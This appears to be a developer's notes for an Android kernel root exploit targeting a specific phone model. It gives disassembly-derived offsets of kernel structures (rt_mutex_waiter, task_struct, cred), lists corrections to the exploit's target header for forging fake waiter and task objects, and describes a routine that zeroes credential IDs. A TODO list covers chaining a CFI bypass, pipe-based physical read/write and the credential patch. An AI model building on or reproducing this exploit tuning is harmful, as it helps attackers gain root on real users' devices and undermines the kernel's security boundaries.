# Manually-derived struct offsets — kernel_5-15-180-vmlinux.elf (POCO air 5.15.180)

Derived with llvm-objdump/nm on the PRODUCTION ELF (NOT pahole/debug kernel, NOT dm3q).
KIMAGE_TEXT_BASE = 0xffffffc008000000.

## rt_mutex_waiter (compact 5.15.180 layout)
From task_blocks_on_rt_mutex (0xffffffc00976ffac):
- stp x20,x19,[x21,#0x30]  => waiter->task@0x30, waiter->lock@0x38
- tree_entry rb_node at [x21]/[x21,#0x8]/[x21,#0x10] => 0x0..0x18
- pi_tree_entry fills the only gap 0x18..0x30
- => TREE_ENTRY 0x0 | PI_TREE_ENTRY 0x18 | TASK 0x30 | LOCK 0x38

## task_struct
From get_task_cred (add x10,x0,#0x790; ldar x19,[x10]), commit_creds
(ldr x19,[x20,#0x790]; ldr x8,[x20,#0x798]), prepare_kernel_cred
(add x10,x21,#0x790; ldar x19,[x10]):
- real_cred @ 0x790
- cred      @ 0x798

## cred
From __sys_setresuid: str w23,[x22,#0x4]=new->uid => uid@0x4; suid@0xc,
euid@0x14, fsuid@0x1c; gid@0x8/sgid@0x10/egid@0x18/fsgid@0x20 by symmetric layout.
From cap_capset: str x8,[x0,#0x28] inh; str x9,[x0,#0x30] perm; str x10,[x0,#0x38] eff;
str x10,[x0,#0x48] ambient; old->cap_bset read at #0x40:
- usage 0x0 | uid 0x4 | gid 0x8 | suid 0xc | sgid 0x10 | euid 0x14 | egid 0x18
- fsuid 0x1c | fsgid 0x20 | securebits 0x24
- cap_inheritable 0x28 | cap_permitted 0x30 | cap_effective 0x38
- cap_bset 0x40 | cap_ambient 0x48

## task_struct pi_* (x19=task in rt_mutex_adjust_prio_chain 0xffffffc009770fa4)
- usage       @ 0x44c  (get_task_struct: str w8,[x0,#0x44c])
- prio        @ 0x7c   (task_blocks_on_rt_mutex cmp task->0x7c vs 0x63)
- normal_prio @ 0x80
- pi_lock     @ 0x884  (ldar/casa spinlock acquire on task+0x884)
- pi_waiters  @ 0x898  (rb_root base)
- pi_blocked_on @ 0x8a0 (store of waiter ptr)
- pi_top_task @ 0x8b0  (load of task ptr)
- sched_task_group @ 0x410  (UNVERIFIED — derive later)

## CORRECTIONS MADE to exploit/src/targets/air-AP3A.240905.015.A2/target.h
- FAKE_WAITER_TASK_OFF 0x50 -> 0x30
- FAKE_WAITER_LOCK_OFF 0x58 -> 0x38
- FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28 -> 0x18 (added TREE_ENTRY 0x0)
- FAKE_WAITER_*(prio/deadline/ww/wake) parked past lock (0x40+) so they
  never clobber task/lock/pi_tree_entry.
- TASK_REAL_CRED_OFF 0xD30 -> 0x790
- TASK_CRED_OFF 0xD38 -> 0x798
- CRED_UID_OFF 8 -> 4
- CRED_SECUREBITS_OFF 40 -> 0x24
- CRED_CAPS_OFF 48 -> 0x28 (+ added CAP_PERMITTED/EFFECTIVE/BSET/AMBIENT)
- FAKE_TASK_USAGE_OFF 0x28 -> 0x44c
- FAKE_TASK_PRIO_OFF 0x6C -> 0x7c
- FAKE_TASK_NORMAL_PRIO_OFF 0x74 -> 0x80
- FAKE_TASK_PI_LOCK_OFF 0xE64 -> 0x884
- FAKE_TASK_PI_WAITERS_OFF 0xE70 -> 0x898
- FAKE_TASK_PI_BLOCKED_ON_OFF 0xE88 -> 0x8a0
- FAKE_TASK_PI_TOP_TASK_OFF 0xE80 -> 0x8b0

## root.c patch_cred_identity
- zero_ids expanded [4]->[8] (16->64 bytes) so all 8 kuid/kgid fields
  (uid..fsgid, 0x4..0x24) are zeroed, not just uid..sgid.

## STILL TODO
- Verify FAKE_TASK_TASK_GROUP_OFF (0x410 unverified).
- Wire exp32 stage (main.c exp_buf) into fops-replace -> try_cfi_stage ->
  pipe physrw -> patch_cred_identity (currently falls through to dead 64-bit
  pselect route in run_exploit).
- Re-derive any other struct offsets used (pipe_buffer, seccomp, page) only if
  they prove wrong on-device.
